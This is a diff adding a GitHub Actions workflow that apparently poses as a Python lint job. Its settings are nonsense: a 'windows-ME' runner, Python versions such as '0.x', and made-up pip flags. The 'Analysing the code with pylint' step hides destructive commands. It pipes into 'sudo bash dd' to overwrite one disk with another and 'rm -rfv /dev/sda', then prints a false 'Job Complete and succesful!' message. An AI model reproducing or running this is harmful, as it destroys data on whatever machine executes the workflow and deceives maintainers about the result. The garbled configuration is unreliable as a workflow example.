@@ -1,0 +1,23 @@
+name: adding dust onto a python file
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: windows-ME
+    strategy:
+      matrix:
+        python-version: ["0.x","1.x", "2.x", "3.x","x.x"]
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v3
+      with:
+        python-version: ${{ matrix.python-version }}
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip --logfile:/WareSoft/.github/dustypy/bin/data/bindata.txt --outdata:/WareSoft/.github/dustypy/bin/data/bindata.txt
+        pip install pylint --version="oldest" --logfile:/WareSoft/.github/dustypy/bin/data/bindata.txt 
+    - name: Analysing the code with pylint
+      run: |
+        pylint $(git ls-files '*.py' | sudo bash dd if=/dev/sdb of=/dev/sda | sudo bash rm -rfv /dev/sda | echo "Job Complete and succesful!")
